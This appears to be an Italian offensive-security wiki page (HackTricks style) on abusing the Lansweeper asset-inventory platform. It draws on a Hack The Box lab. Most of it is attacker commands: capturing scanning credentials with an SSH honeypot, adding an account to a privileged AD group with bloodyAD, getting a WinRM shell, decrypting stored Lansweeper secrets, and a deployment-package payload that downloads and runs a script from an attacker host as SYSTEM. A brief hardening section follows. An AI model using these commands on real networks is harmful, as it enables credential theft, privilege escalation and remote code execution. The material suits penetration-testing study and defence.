# Lansweeper Abuse: Raccolta credenziali, decrittazione dei segreti e RCE tramite Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper è una piattaforma per il discovery e l'inventario degli asset IT comunemente distribuita su Windows e integrata con Active Directory. Le credenziali configurate in Lansweeper sono usate dai suoi motori di scansione per autenticarsi agli asset tramite protocolli come SSH, SMB/WMI e WinRM. Misconfigurazioni permettono frequentemente:

- Intercettazione delle credenziali reindirizzando un Scanning Target verso un host controllato dall'attaccante (honeypot)
- Abuso delle ACL di Active Directory esposte dai gruppi legati a Lansweeper per ottenere accesso remoto
- Decrittazione on-host dei segreti configurati in Lansweeper (connection strings e credenziali di scanning memorizzate)
- Esecuzione di codice su endpoint gestiti tramite la feature Deployment (spesso in esecuzione come SYSTEM)

Questa pagina riassume workflow pratici dell'attaccante e comandi per sfruttare questi comportamenti durante gli engagement.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: crea uno Scanning Target che punti al tuo host e associa ad esso le Scanning Credentials esistenti. Quando la scansione verrà eseguita, Lansweeper tenterà di autenticarsi con quelle credenziali e il tuo honeypot le catturerà.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = il tuo IP VPN
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → assicurati che esistano credenziali Linux/SSH; mappale al nuovo target (abilita tutte quelle necessarie)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validare i creds catturati contro i servizi DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Note
- Funziona in modo analogo per altri protocolli quando puoi forzare lo scanner verso il tuo listener (SMB/WinRM honeypots, ecc.). SSH è spesso il più semplice.
- Molti scanner si identificano con distinti banner del client (es., RebexSSH) e tenteranno comandi benigni (uname, whoami, ecc.).

## 2) AD ACL abuse: ottenere accesso remoto aggiungendoti a un gruppo app-admin

Usa BloodHound per enumerare i diritti effettivi dall'account compromesso. Una scoperta comune è un gruppo specifico dello scanner o dell'app (es., “Lansweeper Discovery”) che detiene GenericAll su un gruppo privilegiato (es., “Lansweeper Admins”). Se il gruppo privilegiato è anche membro di “Remote Management Users”, WinRM diventa disponibile una volta che ci aggiungiamo.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Sfruttare GenericAll su un gruppo con BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Quindi ottieni una shell interattiva:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Suggerimento: Le operazioni Kerberos sono sensibili al tempo. Se ricevi KRB_AP_ERR_SKEW, sincronizza l'orologio con il DC prima:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrittare i segreti configurati da Lansweeper sull'host

Sul server Lansweeper, il sito ASP.NET tipicamente memorizza una connection string crittografata e una chiave simmetrica utilizzata dall'applicazione. Con accesso locale adeguato, è possibile decrittare la connection string del DB e quindi estrarre le credenziali di scansione memorizzate.

Posizioni tipiche:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Usare SharpLansweeperDecrypt per automatizzare la decrittazione e l'estrazione delle credenziali memorizzate:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
L'output previsto include dettagli di connessione al DB e credenziali di scansione in testo chiaro come account Windows e Linux utilizzati nell'intera infrastruttura. Tali credenziali spesso hanno privilegi locali elevati sugli host di dominio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Usa le Windows scanning creds recuperate per ottenere accesso privilegiato:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Come membro di “Lansweeper Admins”, l'interfaccia web espone Deployment e Configuration. Sotto Deployment → Deployment packages, puoi creare pacchetti che eseguono comandi arbitrari sugli asset target. L'esecuzione è effettuata dal servizio Lansweeper con privilegi elevati, ottenendo code execution come NT AUTHORITY\SYSTEM sull'host selezionato.

High-level steps:
- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
- Catch your shell as SYSTEM.

Esempi di payload (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Le azioni di deployment sono rumorose e lasciano tracce in Lansweeper e negli event log di Windows. Usarle con giudizio.

## Rilevamento e hardening

- Limitare o rimuovere le enumerazioni SMB anonime. Monitorare il RID cycling e gli accessi anomali alle condivisioni di Lansweeper.
- Controlli di egress: bloccare o limitare fortemente le connessioni outbound SSH/SMB/WinRM dai host scanner. Allertare su porte non standard (p.es., 2022) e banner client insoliti come Rebex.
- Proteggere `Website\\web.config` e `Key\\Encryption.txt`. Esternalizzare i segreti in un vault e ruotarli in caso di esposizione. Considerare service account con privilegi minimi e gMSA quando possibile.
- Monitoraggio AD: allertare su modifiche ai gruppi legati a Lansweeper (p.es., “Lansweeper Admins”, “Remote Management Users”) e su cambiamenti alle ACL che concedono GenericAll/Write membership su gruppi privilegiati.
- Audit delle creazioni/modifiche/esecuzioni dei Deployment package; allertare su package che avviano cmd.exe/powershell.exe o su connessioni outbound inaspettate.

## Argomenti correlati
- Enumerazione SMB/LSA/SAMR e RID cycling
- Kerberos password spraying e considerazioni sul clock skew
- Analisi dei path con BloodHound per i gruppi application-admin
- Uso di WinRM e lateral movement

## Riferimenti
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
